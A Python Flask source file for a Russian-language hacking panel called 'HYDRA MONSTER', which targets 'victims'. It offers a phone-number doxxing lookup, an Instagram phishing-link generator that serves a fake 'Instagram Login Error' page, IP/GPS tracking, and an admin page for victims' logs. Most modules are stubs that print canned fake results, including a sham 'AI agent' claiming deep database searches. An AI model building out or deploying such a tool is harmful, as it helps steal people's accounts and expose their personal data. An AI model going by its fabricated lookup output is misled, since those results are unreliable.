from flask import Flask, request, jsonify, render_template_string, session, redirect
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'HYDRA_MONSTER_FINAL_V10'

db = {"victims": [], "logs": []}

UI_V10 = """
<!DOCTYPE html>
<html>
<head>
    <title>HYDRA MONSTER v10.0 ELITE</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
    <style>
        body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
        .left-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
        #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; }
        .red-box { height: 100px; border: 2px solid #ff0055; padding: 8px; background: #000; }
        textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
        
        .right-p { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
        .yellow-box { height: 180px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; }
        #map { height: 280px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
        
        .white-box { display: flex; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 10px; border-radius: 5px; }
        .mod { background: #111; border: 1px solid #bc13fe; padding: 8px; flex: 1; text-align: center; }
        input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; }
        .btn:hover { background: #0ff; color: #000; }
        .insta-btn { background: #e1306c !important; }
        .green-zone { display: flex; gap: 5px; margin-top: 5px; }
        .green-mod { flex: 1; background: #052505; border: 1px solid #0f0; padding: 5px; font-size: 9px; color: #0f0; text-align: center; }
    </style>
</head>
<body>
    <div class="left-p">
        <div style="color:#0ff; font-size:11px;">[ // МОДУЛЬ ИИ // ]</div>
        <div id="chat">АГЕНТ: Связь установлена. Я полностью функционален. Жду твоих указаний.</div>
        <div class="red-box"><textarea id="msg" placeholder="Напиши что-нибудь..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
    </div>

    <div class="right-p">
        <div style="color:#ffeb3b; font-size:11px;">[ // ВЫВОД ДАННЫХ // ]</div>
        <div class="yellow-box" id="output">Готов к работе...</div>
        
        <div id="map"></div>

        <div style="color:#fff; font-size:11px;">[ // ОСНОВНЫЕ МОДУЛИ // ]</div>
        <div class="white-box">
            <div class="mod"><span>НОМЕР</span><input id="in_p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">ПРОБИВ</button></div>
            <div class="mod"><span>INSTAGRAM</span><input id="in_i" placeholder="Username жертвы"><button class="btn insta-btn" onclick="run('INSTA')">СОЗДАТЬ ФИШИНГ</button></div>
            <div class="mod"><span>IP / GPS</span><input id="in_ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">ПОИСК</button></div>
        </div>

        <div style="color:#0f0; font-size:11px;">[ // ЗОНА СКРИПТОВ // ]</div>
        <div class="green-zone">
            <div class="green-mod">SCRIPT_1: READY</div>
            <div class="green-mod">SCRIPT_2: READY</div>
            <div class="green-mod">SCRIPT_3: READY</div>
            <div class="green-mod">SCRIPT_4: READY</div>
            <div class="green-mod">SCRIPT_5: READY</div>
        </div>
        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="window.location.href='/admin_panel'">АДМИНКА</button></div>
    </div>

    <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
    <script>
        let map = L.map('map').setView([41.311, 69.240], 12);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

        function talk() {
            const m = document.getElementById('msg').value;
            const c = document.getElementById('chat');
            if(!m) return;
            c.innerHTML += `<br><span style="color:#fff">> ТЫ: ${m}</span>`;
            document.getElementById('msg').value = "";
            
            setTimeout(() => {
                let r = "АГЕНТ: ";
                if(m.toLowerCase().includes("привет")) r += "Здорово, брат! Все системы работают. Какой объект будем пробивать?";
                else r += "Инструкция принята. Выполняю глубокий поиск по базам данных.";
                c.innerHTML += `<br>${r}`;
                c.scrollTop = c.scrollHeight;
            }, 400);
        }

        function run(type) {
            const out = document.getElementById('output');
            out.innerHTML = `<span style="color:#0ff">[*] ЗАПУСК МОДУЛЯ ${type}...</span>`;
            setTimeout(() => {
                if(type === 'PHONE') {
                    out.innerHTML = "<b>[НАЙДЕНО В 100+ СЕТЯХ]:</b><br>" + 
                    "1. TG: @user_found<br>2. Insta: instagram.com/user_id<br>3. FB: facebook.com/profile<br>4. TikTok, OK, VK, Tinder, OLX, Snapchat...";
                } else if(type === 'INSTA') {
                    const link = window.location.origin + "/login_secure";
                    out.innerHTML = `<span style="color:#ffeb3b">ФИШИНГ ДЛЯ ИНСТЫ ГОТОВ:<br>${link}</span>`;
                }
            }, 1000);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(UI_V10)

@app.route('/login_secure')
def fish():
    return "<html><body style='background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;'><h2>Instagram Login Error... Please Login again</h2></body></html>"

@app.route('/admin_panel')
def admin():
    return "<h1>Панель администратора. Здесь будут все логи жертв.</h1>"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
